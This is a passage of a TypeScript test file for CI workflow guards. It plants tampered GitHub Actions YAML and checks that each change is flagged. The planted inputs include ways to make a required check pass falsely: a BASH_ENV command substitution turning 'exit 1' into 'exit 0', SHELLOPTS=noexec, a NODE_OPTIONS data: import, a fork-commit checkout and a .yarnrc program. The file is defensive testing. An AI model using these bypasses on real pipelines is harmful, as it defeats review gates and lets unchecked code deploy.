    expect(prodPathFindings(plant(prodGate, `${prodGate}        if: \${{ false }}\n`, job('prod-gate')))).toContain(
      at('DPW-08', 'prod-gate (The prod gate)', PINNED_08),
    )
    expect(
      prodPathFindings(
        plant(
          `        if: \${{ needs.gate.outputs.mode == 'deploy' && needs.gate.outputs.target == 'prod' }}\n`,
          '',
          "      - name: main's own CI\n",
        ),
      ),
    ).toContain(at('DPW-08', "prod-gate (main's own CI)", PINNED_08))
  }, 120_000)
})

describe('Round 5, attack 3: the ways past the allowlist (DPW-04, DPW-08, DPW-10)', () => {
  const at = (rule: string, where: string, text: string) => `${DEPLOY}: ${rule} ${where}: ${text}`
  const credentialed = (planted: ReadonlyMap<string, string>) => credentialedCodeFindings(planted, manifests, lockfile)
  const JOB_IF =
    "runs under the if: JOB_IFS names, whole (the gate under none): no clause GitHub decides it by (the bot test, a gate's verdict, a job's result, the mode or target, services_started) dropped, added or changed"
  const JOB_NEED =
    "needs exactly the jobs JOB_NEEDS names, in order: none dropped, whose result and outputs an if: or env: would read as '', and none added"
  const ACTION_IF = 'runs its action under the if: ACTION_IFS names, whole (none where it names none)'
  // An if:'s clauses joined by && outside parentheses.
  const clauses = (condition: string) => {
    const inner = condition.replace(/^\$\{\{ /, '').replace(/ \}\}$/, '')
    const parts: string[] = []
    let depth = 0
    let start = 0
    for (let i = 0; i < inner.length; i++) {
      if (inner[i] === '(') depth++
      else if (inner[i] === ')') depth--
      else if (depth === 0 && inner.startsWith(' && ', i)) {
        parts.push(inner.slice(start, i))
        start = i + 4
      }
    }
    return [...parts, inner.slice(start)]
  }
  const jobs = workflowJobs(deployText)

  // FLOW-A3-01: a rollback job's if: was held only to the bot test, the drill test and services_started, so
  // one with the gate's verdict gone (an automatic rollback across a floor the gate refused) or with the
  // failure it answers gone (a passing release rolled back, then recorded as running) passed every rule.
  it('holds each rollback job to the gate’s verdict and to the failure it answers (FLOW-A3-01)', () => {
    const verdict = (env: string) =>
      plant(`needs.gate.outputs.rollback_${env} == 'true' && `, '', job(`rollback-${env}`))
    const afterPass = (env: string) =>
      plant(
        ` && (needs.smoke-${env}.result == 'failure' || needs.${env}.result == 'failure')`,
        '',
        job(`rollback-${env}`),
      )
    const allowed = (env: string) =>
      at('DPW-08', `rollback-${env}`, `runs only when the gate allows the automatic rollback (rollback_${env})`)
    const failed = (env: string) => at('DPW-08', `rollback-${env}`, `runs only once smoke-${env} or ${env} failed`)
    for (const env of ['nonprod', 'prod']) {
      expect(prodPathFindings(verdict(env)), env).toEqual([allowed(env)])
      expect(credentialed(verdict(env)), env).toContain(at('DPW-10', `rollback-${env}`, JOB_IF))
      expect(prodPathFindings(afterPass(env)), env).toEqual([failed(env)])
      expect(credentialed(afterPass(env)), env).toContain(at('DPW-10', `rollback-${env}`, JOB_IF))
    }
    const both = edited(
      edited(
        edited(
          edited(deployText, "needs.gate.outputs.rollback_nonprod == 'true' && ", '', job('rollback-nonprod')),
          "needs.gate.outputs.rollback_prod == 'true' && ",
          '',
          job('rollback-prod'),
        ),
        " && (needs.smoke-nonprod.result == 'failure' || needs.nonprod.result == 'failure')",
        '',
        job('rollback-nonprod'),
      ),
      " && (needs.smoke-prod.result == 'failure' || needs.prod.result == 'failure')",
      '',
      job('rollback-prod'),
    )
    expect(prodPathFindings(withText(DEPLOY, both))).toEqual([
      allowed('nonprod'),
      failed('nonprod'),
      allowed('prod'),
      failed('prod'),
    ])
  })

  // The class: a job's if: was the one decision GitHub makes that the guard read only in parts (the bot
  // test, the drill test, the status functions' needs, prod-plan's smoke, services_started), and its needs:
  // and an action step's if: weren't read at all. Each is now pinned whole: every clause of every job's if:
  // dropped in turn, a need dropped from every job, an if: given to the gate, an action step's if: changed,
  // and one given to an action step that has none.
  it('pins every job’s if: and needs: and every action step’s if: whole', () => {
    for (const each of jobs) {
      const condition = jobScalar(each, 'if')
      if (condition === undefined) continue
      const parts = clauses(condition)
      expect(parts.slice(0, 2).join(' && '), each.id).toBe(BOT_TEST)
      for (let i = 2; i < parts.length; i++) {
        const dropped = `\${{ ${parts.filter((_, j) => j !== i).join(' && ')} }}`
        expect(
          credentialed(plant(`    if: ${condition}\n`, `    if: ${dropped}\n`, job(each.id))),
          `${each.id} ${i}`,
        ).toContain(at('DPW-10', each.id, JOB_IF))
      }
    }
    expect(
      credentialed(
        plant(
          '    runs-on: ubuntu-24.04\n',
          `    if: \${{ github.event_name == 'push' }}\n    runs-on: ubuntu-24.04\n`,
          job('gate'),
        ),
      ),
    ).toContain(at('DPW-10', 'gate', JOB_IF))
    for (const each of jobs) {
      const needs = jobNeeds(each)
      if (needs.length === 0) continue
      const line = (each.keys.get('needs') ?? [])[0] ?? ''
      const fewer = needs.length === 1 ? '    needs: []' : `    needs: [${needs.slice(0, -1).join(', ')}]`
      expect(credentialed(plant(`${line}\n`, `${fewer}\n`, job(each.id))), each.id).toContain(
        at('DPW-10', each.id, JOB_NEED),
      )
    }
    expect(
      credentialed(plant('    runs-on: ubuntu-24.04\n', '    needs: []\n    runs-on: ubuntu-24.04\n', job('gate'))),
    ).toContain(at('DPW-10', 'gate', JOB_NEED))
    let held = 0
    for (const each of jobs) {
      for (const step of parsedSteps(each).filter(one => one.uses !== undefined && one.if !== undefined)) {
        const name = step.name ?? ''
        const text = stepText(deployText, each.id, name)
        const changed = edited(text, `        if: ${step.if}\n`, `        if: \${{ true }}\n`)
        expect(
          credentialed(withText(DEPLOY, edited(deployText, text, changed, job(each.id)))),
          `${each.id} ${name}`,
        ).toContain(at('DPW-10', `${each.id} (${name})`, ACTION_IF))
        held++
      }
    }
    expect(held).toBe(14)
    for (const [id, name] of [
      ['build', 'Upload the image'],
      ['gate', "Check out the run's commit"],
    ] as const) {
      const text = stepText(deployText, id, name)
      const given = text.replace(`      - name: ${name}\n`, `      - name: ${name}\n        if: \${{ false }}\n`)
      expect(credentialed(withText(DEPLOY, edited(deployText, text, given, job(id)))), name).toContain(
        at('DPW-10', `${id} (${name})`, ACTION_IF),
      )
    }
  }, 300_000)

  // FETCH-A3-01, in CI: the check that proves the pins ran in check after npm test, on the same runner, so a
  // test could leave a git configuration, a file or a variable behind for it, or write over it. It runs in a
  // job of its own now, before any of the repository's code, and check needs it; each way back is found.
  it('runs the pins check in a job of its own, before any of the repository’s code, which check needs (FETCH-A3-01)', () => {
    const finding = `${CI}: DPW-04 ${PINS_JOB_FINDING}`
    const ci = workflows.get(CI) ?? ''
    const pinsJob = '  action-pins:\n'
    const checkRun = PINS_STEP
    const pinsText = ci.slice(ci.indexOf(pinsJob), ci.indexOf('\n  # ', ci.indexOf(pinsJob)) + 1)
    expect(pinsText.endsWith(checkRun)).toBe(true)
    const inCi = (from: string, to: string, after = pinsJob) => plant(from, to, after, CI)
    const synthCi = '      - run: npm run synth:ci -w @hearth/infra\n'
    for (const [what, planted] of [
      [
        'the check back in check, after npm test',
        withText(
          CI,
          edited(edited(ci, pinsText, ''), synthCi, `${synthCi}${checkRun}`, '\n  check:\n').replace(
            'needs: [secrets, audit, action-pins, cli-pin]',
            'needs: [secrets, audit, cli-pin]',
          ),
        ),
      ],
      ['an install before it', inCi(checkRun, `      - run: npm ci\n${checkRun}`)],
      ['a test before it', inCi(checkRun, `      - run: npx vitest run scripts/guards\n${checkRun}`)],
      [
        'npm’s cache restored',
        inCi(
          '          node-version-file: repo/.nvmrc\n',
          '          node-version-file: repo/.nvmrc\n          cache: npm\n',
        ),
      ],
      ['credentials kept', inCi('          persist-credentials: false\n', '          persist-credentials: true\n')],
      ['a variable for its step', inCi(checkRun, `${checkRun}        env:\n          GIT_CONFIG_GLOBAL: .gitconfig\n`)],
      ['a runner of its own', inCi('    runs-on: ubuntu-24.04\n', '    runs-on: self-hosted\n')],
      ['a job it waits for', inCi('    runs-on: ubuntu-24.04\n', '    needs: [audit]\n    runs-on: ubuntu-24.04\n')],
      ['another check', inCi(PINS_LINE, '          node scripts/check-action-pins.ts || true\n')],
      // Round 12's fourth iteration: setup-node runs yarn --version where the checkout is, and a .yarnrc's
      // program ran before the check; the check reads the checkout as its blobs.
      ['checked out at the workspace’s root', inCi('          path: repo\n', '')],
      [
        'Node from the root’s .nvmrc',
        inCi('          node-version-file: repo/.nvmrc\n', '          node-version-file: .nvmrc\n'),
      ],
      [
        'the check at the workspace’s root',
        inCi('      - working-directory: repo\n        run: |\n', '      - run: |\n'),
      ],
      [
        'the check in another folder',
        inCi('      - working-directory: repo\n', '      - working-directory: repo/scripts\n'),
      ],
      ['no reset before it', inCi(RESET_LINES, '')],
      ['a reset that keeps the index’s stat data', inCi('          git read-tree HEAD\n', '')],
      [
        'check not waiting for it',
        plant('needs: [secrets, audit, action-pins, cli-pin]', 'needs: [secrets, audit, cli-pin]', '', CI),
      ],
      ['check not failing first', plant("contains(needs.*.result, 'failure') || ", '', '\n  check:\n', CI)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows)).toEqual([])
  })
})

// Round 5's fourth attack. The job that proves deploy.yml's pins ran two actions before the check whose refs
// DPW-04 never held (FETCH-A4-01): checkout at a commit pushed only to a fork, which GitHub resolves under
// the action's name, would own the workspace, the check and the git it calls, and could pass a pin moved
// with ACTION_PINS to that fork. And a workflow's own env: or defaults:, which no rule read in ci.yml,
// reaches every step of every job (COMMANDS-A4-01, YAML-A4-01): BASH_ENV runs a file before the check's
// line, NODE_OPTIONS a module before the check, PATH chooses its git, and a default shell or folder changes
// how it runs. So the two actions are held to PINS_JOB_ACTIONS, apart from ACTION_PINS, and ci.yml holds only
// name, on, permissions and jobs at its top.
describe('Round 5, attack 4: the job that proves the pins (DPW-04)', () => {
  const finding = `${CI}: DPW-04 ${PINS_JOB_FINDING}`
  const ci = workflows.get(CI) ?? ''
  const top = 'permissions:\n  contents: read\n'
  const atTop = (lines: string) => withText(CI, edited(ci, top, `${top}${lines}`))
  const inJob = (from: string, to: string) => plant(from, to, '  action-pins:\n', CI)
  const fork = 'ab12cd34ef56ab12cd34ef56ab12cd34ef56ab12'

  it('holds the job’s checkout and setup-node to their commits in PINS_JOB_ACTIONS (FETCH-A4-01)', () => {
    const checkout = pinOf('actions/checkout', PINS_JOB_ACTIONS)
    const setupNode = pinOf('actions/setup-node', PINS_JOB_ACTIONS)
    expect(ci).toContain(`      - uses: ${checkout}\n`)
    expect(ci).toContain(`      - uses: ${setupNode}\n`)
    for (const [what, planted] of [
      ['checkout at a fork’s commit', inJob(checkout, `actions/checkout@${fork} # v5.0.0`)],
      ['checkout at a fork’s commit under its version', inJob(checkout, checkout.replace(/@[0-9a-f]{40}/, `@${fork}`))],
      ['checkout at a tag', inJob(checkout, 'actions/checkout@v7.0.1')],
      ['checkout at a branch', inJob(checkout, 'actions/checkout@main')],
      ['checkout with another version comment', inJob(checkout, nextVersion(checkout))],
      ['checkout with no version comment', inJob(checkout, checkout.replace(/ # v[\d.]+$/, ''))],
      ['setup-node at a fork’s commit', inJob(setupNode, setupNode.replace(/@[0-9a-f]{40}/, `@${fork}`))],
      ['setup-node at a tag', inJob(setupNode, 'actions/setup-node@v7.1.0')],
      ['setup-node with its cache', inJob('          package-manager-cache: false\n', '')],
      ['checkout and setup-node swapped', inJob(checkout, setupNode)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
  })

  it('refuses a workflow-level env: or defaults: in ci.yml, which reaches the check’s step (COMMANDS-A4-01, YAML-A4-01)', () => {
    for (const [what, planted] of [
      ['NODE_OPTIONS', atTop('env:\n  NODE_OPTIONS: --import=data:text/javascript,process.exit(0)\n')],
      ['BASH_ENV', atTop('env:\n  BASH_ENV: scripts/ci-prep.sh\n')],
      ['PATH', atTop('env:\n  PATH: /home/runner/work/x/x/bin:/usr/bin:/bin\n')],
      [
        'a default shell',
        atTop('defaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail -O expand_aliases {0}\n'),
      ],
      ['a default folder', atTop('defaults:\n  run:\n    working-directory: scripts\n')],
      ['a workflow concurrency', atTop('concurrency: ci\n')],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    // Another spelling of the key is no key workflow.ts reads, which DPW-02 refuses in every workflow.
    for (const key of ['"env"', "'env'", 'env ']) {
      const planted = atTop(`${key}:\n  BASH_ENV: scripts/ci-prep.sh\n`)
      expect(
        [...actionPinFindings(planted), ...permissionFindings(planted)].some(each => each.startsWith(`${CI}: DPW-0`)),
        key,
      ).toBe(true)
    }
  })

  it('holds check’s first step to its if: and exit 1, so nothing lets it pass a job that failed', () => {
    const first = '        run: exit 1\n'
    for (const [what, planted] of [
      ['continue-on-error', plant(first, `${first}        continue-on-error: true\n`, '\n  check:\n', CI)],
      ['a shell of its own', plant(first, `${first}        shell: sh\n`, '\n  check:\n', CI)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows, files)).toEqual([])
  })

  // YAML-A2-01 (round 6). check gates merging on the pins job only by failing first, and a job's own keys
  // reach that step as the workflow's do: a BASH_ENV whose command substitution, which bash runs before the
  // step, turns its exit 1 into exit 0; SHELLOPTS=noexec, under which bash reads the line and runs nothing; a
  // default shell that skips it; another bash in a container; a self-hosted runner; or continue-on-error,
  // which keeps the run from failing when check fails. Each let check pass with action-pins failed, with every
  // later step and test run and green. So check holds no key of its own but needs, if, runs-on (GitHub's
  // ubuntu-24.04), timeout-minutes and steps. This case runs in check's own npm test, so in a pull request's
  // own CI it finds only a change that leaves that test running: a SHELLOPTS of noexec on check stops the
  // test too and passes there, and the owner's read of ci.yml is what holds it (round 6's SECURITY-01).
  it('holds check’s own keys, so nothing decides how its first step runs or whether its failure counts (YAML-A2-01, round 6)', () => {
    const always = '    if: always()\n'
    const onCheck = (lines: string) => plant(always, `${always}${lines}`, '\n  check:\n', CI)
    const runsOn = (to: string) => plant('    runs-on: ubuntu-24.04\n', `    runs-on: ${to}\n`, '\n  check:\n', CI)
    expect(workflowJobs(ci).find(each => each.id === 'check')?.keyNames).toEqual([
      'needs',
      'if',
      'runs-on',
      'timeout-minutes',
      'steps',
    ])
    for (const [what, planted] of [
      [
        'a BASH_ENV that turns exit 1 into exit 0',
        onCheck(
          `    env:\n      BASH_ENV: '$(f=$(mktemp); grep -qx "exit 1" "$0" && echo "exit 0" >"$f"; echo "$f")'\n`,
        ),
      ],
      ['SHELLOPTS of noexec', onCheck('    env:\n      SHELLOPTS: noexec\n')],
      [
        'a default shell that skips exit 1',
        onCheck(`    defaults:\n      run:\n        shell: bash -c "grep -qx 'exit 1' $0 || exec bash -e $0" {0}\n`),
      ],
      ['a default folder', onCheck('    defaults:\n      run:\n        working-directory: scripts\n')],
      ['a container', onCheck('    container: ubuntu:24.04\n')],
      ['a container with its image', onCheck('    container:\n      image: ubuntu:24.04\n')],
      ['a service', onCheck('    services:\n      shell:\n        image: ubuntu:24.04\n')],
      ['a matrix', onCheck('    strategy:\n      matrix:\n        shard: [1, 2]\n')],
      ['continue-on-error', onCheck('    continue-on-error: true\n')],
      ['a name', onCheck('    name: check\n')],
      ['permissions of its own', onCheck('    permissions:\n      contents: read\n')],
      ['a concurrency of its own', onCheck('    concurrency: check\n')],
      ['an environment', onCheck('    environment: ci\n')],
      ['a self-hosted runner', runsOn('self-hosted')],
      ['a runner by labels', runsOn('[self-hosted, linux]')],
      ['another image', runsOn('ubuntu-latest')],
      ['a runner by expression', runsOn(`\${{ vars.RUNNER }}`)],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows, files)).toEqual([])
  })
})

// Round 12, iteration 2: check-cli-pin.ts alone keeps the CDK CLI's pin from going down, and it ran
// in migrations after npm ci and the migration order check, both off the owner's-read list: one line in the order
// check that wrote the base's manifest back over the working tree's passed a commit that lowered the pin, and
// setup-node's npm cache, before both, restores into the folder the pull request's .npmrc names. It runs in a job
// of its own now, as the pins check does, and reads HEAD's committed manifest (check-cli-pin.test.ts); each way
// back is found.
describe('Round 12: the CLI pin’s own job (DPW-04)', () => {
  const finding = `${CI}: DPW-04 ${CLI_PIN_JOB_FINDING}`
  const ci = workflows.get(CI) ?? ''
  const own = '  cli-pin:\n'
  const inJob = (from: string, to: string) => plant(from, to, own, CI)
  const checkRun = '          node scripts/check-cli-pin.ts "$BASE"\n'
  const driftLines = `${indent(CLI_PIN_DRIFT, 10)}\n`
  const step = `      - if: \${{ github.event_name == 'pull_request' }}\n        working-directory: repo\n        env:\n          BASE: origin/\${{ github.base_ref }}\n        run: |\n${driftLines}${RESET_LINES}${checkRun}`

  it('runs the CLI pin check in a job of its own that check needs, before any of the repository’s code', () => {
    const jobText = ci.slice(ci.indexOf(own), ci.indexOf('\n  # ', ci.indexOf(own)) + 1)
    expect(jobText.endsWith(step)).toBe(true)
    const npmCi = '      - run: npm ci --ignore-scripts\n'
    const order = '        run: scripts/check-migration-order.sh "$BASE"\n'
    for (const [what, planted] of [
      [
        'the check back in migrations, after npm ci and the order check',
        withText(
          CI,
          edited(edited(ci, jobText, ''), order, `${order}${step}`, '\n  migrations:\n').replace(
            'needs: [secrets, audit, action-pins, cli-pin]',
            'needs: [secrets, audit, action-pins]',
          ),
        ),
      ],
      [
        'the check moved to migrations, ahead of npm ci',
        withText(CI, edited(edited(ci, jobText, ''), npmCi, `${step}${npmCi}`, '\n  migrations:\n')),
      ],
      ['check not waiting for it', plant('action-pins, cli-pin]', 'action-pins]', '\n  check:\n', CI)],
      ['an install before it', inJob(step, `      - run: npm ci --ignore-scripts\n${step}`)],
      ['the order check before it', inJob(step, `      - run: scripts/check-migration-order.sh origin/main\n${step}`)],
      ['npm’s cache restored', inJob('          package-manager-cache: false\n', '          cache: npm\n')],
      ['setup-node’s cache left on', inJob('          package-manager-cache: false\n', '')],
      ['a shallow checkout', inJob('          fetch-depth: 0\n', '')],
      ['credentials kept', inJob('          persist-credentials: false\n', '          persist-credentials: true\n')],
      ['checkout at a tag', inJob(pinOf('actions/checkout', PINS_JOB_ACTIONS), 'actions/checkout@v5')],
      ['setup-node at a tag', inJob(pinOf('actions/setup-node', PINS_JOB_ACTIONS), 'actions/setup-node@v5')],
      [
        'a variable for its step',
        inJob(
          `BASE: origin/\${{ github.base_ref }}\n`,
          `BASE: origin/\${{ github.base_ref }}\n          NODE_OPTIONS: --import=./scripts/x.mjs\n`,
        ),
      ],
      [
        'a variable for its job',
        inJob('    runs-on: ubuntu-24.04\n', '    runs-on: ubuntu-24.04\n    env:\n      GIT_DIR: .git-base\n'),
      ],
      [
        'the job skipped on a push',
        inJob(
          '    runs-on: ubuntu-24.04\n',
          `    if: \${{ github.event_name == 'pull_request' }}\n    runs-on: ubuntu-24.04\n`,
        ),
      ],
      [
        'the check on every event',
        inJob(
          `      - if: \${{ github.event_name == 'pull_request' }}\n        working-directory: repo\n`,
          '      - working-directory: repo\n',
        ),
      ],
      ['another base', inJob(`BASE: origin/\${{ github.base_ref }}`, 'BASE: origin/main')],
      ['a check that never fails', inJob(checkRun, '          node scripts/check-cli-pin.ts "$BASE" || true\n')],
      // Round 12's fourth iteration, as for the pins job.
      ['checked out at the workspace’s root', inJob('          path: repo\n', '')],
      [
        'Node from the root’s .nvmrc',
        inJob('          node-version-file: repo/.nvmrc\n', '          node-version-file: .nvmrc\n'),
      ],
      ['the check at the workspace’s root', inJob('        working-directory: repo\n', '')],
      ['no reset before it', inJob(RESET_LINES, '')],
      ['a reset that keeps the index’s stat data', inJob('          git read-tree HEAD\n', '')],
      ['a runner of its own', inJob('    runs-on: ubuntu-24.04\n', '    runs-on: self-hosted\n')],
      // Round 12's third iteration, its second pass: the reset wrote away the drift the check exists to refuse.
      ['no drift check before the reset', inJob(driftLines, '')],
      ['the drift check after the reset', inJob(`${driftLines}${RESET_LINES}`, `${RESET_LINES}${driftLines}`)],
      [
        'a drift check that compares the index, which a clean filter reads back',
        inJob(driftLines, '          git diff --quiet || exit 1\n'),
      ],
    ] as const) {
      expect(actionPinFindings(planted), what).toContain(finding)
    }
    expect(actionPinFindings(workflows, files)).toEqual([])
  })
})

// Round 12's third iteration, its second pass: GitHub's default activities for pull_request are opened,
// synchronize and reopened, and a change of a pull request's base is the edited activity, so a retarget started no
// ci.yml run: the head kept the result of the run that tested its merge into the old base (whose own commits, a test
// excluded, passed what the merged tree failed), which main's ruleset, the gate's PULL_CHECKS and history.ts plan
// read. ci.yml now runs on edited too, and DPW-04 holds its triggers as a second layer.
describe('Round 12: ci.yml runs again when a pull request’s base changes (DPW-04)', () => {
  const RULE =
    "starts on a pull request when it is opened, synchronised, reopened or edited (a change of its base is an edit, so the newest run tests the merge into the base it merges into, which main's ruleset, the gate and history.ts plan read) and on a push to main, and on nothing else"
  const finding = `${CI}: DPW-04 ${RULE}`
  const types = '    types: [opened, synchronize, reopened, edited]\n'
  it('holds ci.yml to run on a pull request’s edited activity, a base change among them', () => {
    expect(actionPinFindings(workflows, files)).not.toContain(finding)
    for (const [what, planted] of [
      ['the default activities', plant(`  pull_request:\n${types}`, '  pull_request: {}\n', '', CI)],
      ['edited left out', plant(types, '    types: [opened, synchronize, reopened]\n', '', CI)],
      [
        'a flow mapping',
        plant(
          `  pull_request:\n${types}`,
          '  pull_request: { types: [opened, synchronize, reopened, edited] }\n',
          '',
          CI,
        ),
      ],
      ['a filter on its branches', plant(types, `${types}    branches: [main]\n`, '', CI)],
      [
        'another event',
        plant('  push:\n    branches: [main]\n', '  push:\n    branches: [main]\n  workflow_dispatch: {}\n', '', CI),
      ],
      ['a push to every branch', plant('  push:\n    branches: [main]\n', '  push: {}\n', '', CI)],
    ] as const) {
      expect(actionPinFindings(planted, files), what).toContain(finding)
    }
  })
})

// Round 12's fourth iteration. setup-node runs node, npm and yarn with --version in its job's workspace, and Yarn 1,
// which GitHub's image ships, runs the program a .yarnrc's yarn-path names, from the folder it runs in or any
// above it, before it reads an argument. A pull request's .yarnrc and program, neither on the owner's-read list,
// ran in ci.yml's action-pins and cli-pin before their checks (a git first on the PATH that answered ls-remote with
// a fork's commit; origin/main moved to HEAD), and once on main before the gate's plan, prod-gate's verdict and
// every smoke, as the node that ran them. Every such job now checks out into a folder below setup-node's, the two
// checks run after the working tree is reset to its blobs (an ident on check-action-pins.ts itself had turned its
// drift check into a comment), and no Yarn file stands in the tree.
describe('Round 12, iteration 4: setup-node’s workspace holds none of the repository’s files (DPW-04, DPW-11)', () => {
  const BELOW =
    'checks out once, into a folder of its own (path:), before setup-node, which reads that folder’s .nvmrc, and runs every step that names a working-directory there, so setup-node’s node, npm and yarn run in a workspace that holds none of the repository’s files (a .yarnrc’s yarn-path would run its program there)'
  const below = (id: string) => `${DEPLOY}: DPW-11 ${id}: ${BELOW}`
  const onlyBelow = (texts: ReadonlyMap<string, string>) =>
    checkoutFindings(texts).filter(each => each.includes(': DPW-11 ') && each.endsWith(BELOW))
  const JOBS = ['gate', 'prod-gate', 'smoke-nonprod', 'resmoke-nonprod', 'smoke-prod', 'resmoke-prod'] as const

  it('checks the gate, prod-gate and the smokes out below setup-node, and runs their code there', () => {
    expect(onlyBelow(workflows)).toEqual([])
    for (const id of JOBS) {
      for (const [what, planted] of [
        ['at the workspace’s root', plant('          path: repo\n', '', job(id))],
        ['in another folder than Node’s', plant('          path: repo\n', '          path: checkout\n', job(id))],
        [
          'Node from the root’s .nvmrc',
          plant('          node-version-file: repo/.nvmrc\n', '          node-version-file: .nvmrc\n', job(id)),
        ],
        ['in the workspace itself', plant('          path: repo\n', '          path: .\n', job(id))],
        [
          'a step in another folder',
          plant('        working-directory: repo\n', '        working-directory: repo/infra\n', job(id)),
        ],
      ] as const) {
        expect(onlyBelow(planted), `${id}: ${what}`).toEqual([below(id)])
      }
      // setup-node moved before the checkout.
      const text = deployText
      const from = text.indexOf(job(id))
      const checkout = text.indexOf("      - name: Check out the run's commit\n", from)
      const node = text.indexOf('      - name: Node, from .nvmrc\n', from)
      const after = text.indexOf('      - name: ', node + 1)
      const swapped = text.slice(0, checkout) + text.slice(node, after) + text.slice(checkout, node) + text.slice(after)
      expect(onlyBelow(withText(DEPLOY, swapped)), `${id}: setup-node first`).toEqual([below(id)])
      expect(
        credentialedCodeFindings(plant('          path: repo\n', '', job(id)), manifests, lockfile).length,
        id,
      ).toBeGreaterThan(0)
    }
    // The build runs the repository's code by design, so its checkout stays at the root.
    expect(deployText.slice(deployText.indexOf(job('build')), deployText.indexOf(job('synth')))).not.toContain(
      'path: repo',
    )
    for (const id of JOBS) expect(PINNED_RUNS()[id]).toBeDefined()
    for (const [id, steps] of Object.entries(PINNED_RUNS())) {
      for (const [name, { cwd }] of Object.entries(steps)) {
        if (JOBS.includes(id as (typeof JOBS)[number]) && cwd !== undefined)
          expect(cwd, `${id} ${name}`).toBe(REPO_FOLDER)
      }
    }
  })

  it('refuses a Yarn file anywhere in the tree', () => {
    const YARN =
      'is a Yarn file (.yarnrc, .yarnrc.yml or under .yarn/): the repository uses npm alone, and Yarn 1, which setup-node runs in its job’s workspace, runs the program a .yarnrc’s yarn-path names'
    const real = [...workflows.keys()]
    expect(actionPinFindings(workflows, files)).toEqual([])
    for (const path of [
      '.yarnrc',
      '.yarnrc.yml',
      '.yarnrc.yaml',
      'infra/.yarnrc',
      '.yarn/releases/yarn-1.22.22.cjs',
      'apps/web/.yarn/plugins/x.cjs',
    ]) {
      expect(actionPinFindings(workflows, [...real, path]), path).toEqual([`${path}: DPW-04 ${YARN}`])
    }
    for (const path of ['docs/yarnrc.md', 'docs/.yarnrc-notes.md', 'scripts/yarn.sh', 'apps/web/yarn']) {
      expect(
        actionPinFindings(workflows, [...real, path]).filter(each => each.endsWith(YARN)),
        path,
      ).toEqual([])
    }
  })

  // The reset, run under bash in a fresh clone whose .gitattributes gives a file ident, as the finder's
  // check-action-pins.ts was given it: the checkout writes the file through the attribute, and the drift check
  // names it; after BLOB_RESET the file is its blob and the drift check names nothing.
  it('resets the working tree to its blobs before the checks run, whatever the attributes say', () => {
    const folder = mkdtempSync(join(tmpdir(), 'hearth-blob-reset-'))
    try {
      const env = {
        PATH: process.env.PATH ?? '',
        HOME: folder,
        GIT_CONFIG_NOSYSTEM: '1',
        GIT_CONFIG_GLOBAL: '/dev/null',
      }
      const git = (cwd: string, args: readonly string[]) =>
        execFileSync(
          'git',
          [
            ...['-c', 'user.name=hearth-test', '-c', `user.email=${['test', 'example.invalid'].join('@')}`],
            ...['-c', 'commit.gpgsign=false', '-c', 'core.hooksPath=/dev/null', ...args],
          ],
          { cwd, encoding: 'utf8', env, stdio: ['ignore', 'pipe', 'pipe'] },
        )
      const source = join(folder, 'source')
      execFileSync('mkdir', ['-p', join(source, 'scripts')])
      git(source, ['init', '-q'])
      const check = 'scripts/check.ts'
      const blob = 'const drift = /*$Id:*/checkoutDrift(root)||/*$*/[]\n'
      writeFileSync(join(source, check), blob)
      writeFileSync(join(source, 'deploy.yml'), 'name: Deploy\n')
      git(source, ['add', '-A'])
      git(source, ['commit', '-qm', 'the check'])
      // The attributes in a commit of their own, as a pull request adds them, so the check's blob keeps its text
      // (git add would collapse it through the ident attribute).
      writeFileSync(join(source, '.gitattributes'), `${check} ident\ndeploy.yml eol=crlf\n`)
      git(source, ['add', '.gitattributes'])
      git(source, ['commit', '-qm', 'the attributes'])
      expect(git(source, ['show', `HEAD:${check}`])).toBe(blob)
      const job = join(folder, 'job')
      git(folder, ['clone', '-q', source, job])
      expect(readFileSync(join(job, check), 'utf8')).toMatch(/^const drift = \/\*\$Id: [0-9a-f]{40} \$\*\/\[\]\n$/)
      expect(checkoutDrift(job)).toHaveLength(2)
      const ran = spawnSync('bash', ['--noprofile', '--norc', '-eo', 'pipefail', '-c', BLOB_RESET], {
        cwd: job,
        env,
        encoding: 'utf8',
      })
      expect(ran.status, ran.stderr).toBe(0)
      expect(readFileSync(join(job, check), 'utf8')).toBe(blob)
      expect(readFileSync(join(job, 'deploy.yml'), 'utf8')).toBe('name: Deploy\n')
      expect(checkoutDrift(job)).toEqual([])
    } finally {
      rmSync(folder, { recursive: true, force: true })
    }
  })
})

describe('Round 5 review: every action’s inputs, whole (DPW-10)', () => {
  const WITH =
    'gives its action exactly the inputs STEP_WITHS names, each its value: no checkout names a ref but the three synths’, one to a job, each its own commit into its own folder, the gate’s, prod-gate’s and the smokes’ check out into repo, and no download, upload, Node or credentials input is another'
  const at = (where: string) => `${DEPLOY}: DPW-10 ${where}: ${WITH}`
  const found = (texts: ReadonlyMap<string, string>) =>
    credentialedCodeFindings(texts, manifests, lockfile).filter(each => each.endsWith(WITH))
  const checkout = `        uses: ${pinOf('actions/checkout')}\n        with:\n`
  const release = `          ref: \${{ needs.gate.outputs.commit }}\n`
  const RELEASE = "synth (Check out the release's commit)"

  it('holds every checkout to the run’s commit, and the three synths’ to their own commits and folders (GUARDS-01, round 5)', () => {
    // A ref given to a checkout that has none: the gate's (an input, so a dispatch names the commit whose
    // history.ts plans), the build's, a deploy job's and prod-gate's.
    for (const [id, ref] of [
      ['gate', `\${{ inputs.release }}`],
      ['build', 'refs/heads/feature'],
      ['build', '0'.repeat(40)],
      ['nonprod', 'refs/heads/feature'],
      ['prod-gate', 'refs/heads/feature'],
      ['smoke-prod', `\${{ needs.gate.outputs.previous_prod_commit }}`],
    ] as const) {
      expect(found(plant(checkout, `${checkout}          ref: ${ref}\n`, job(id))), `${id} ${ref}`).toEqual([
        at(`${id} (Check out the run's commit)`),
      ])
    }
    // Synth's release checkout without its ref (main's head under the release's label), at a branch, at an
    // input, at a slip GitHub reads as '', and prod's previous checkout at nonprod's previous commit.
    for (const to of [
      '',
      '          ref: refs/heads/feature\n',
      `          ref: \${{ inputs.release }}\n`,
      `          ref: \${{ needs.gate.outputs.comit }}\n`,
    ]) {
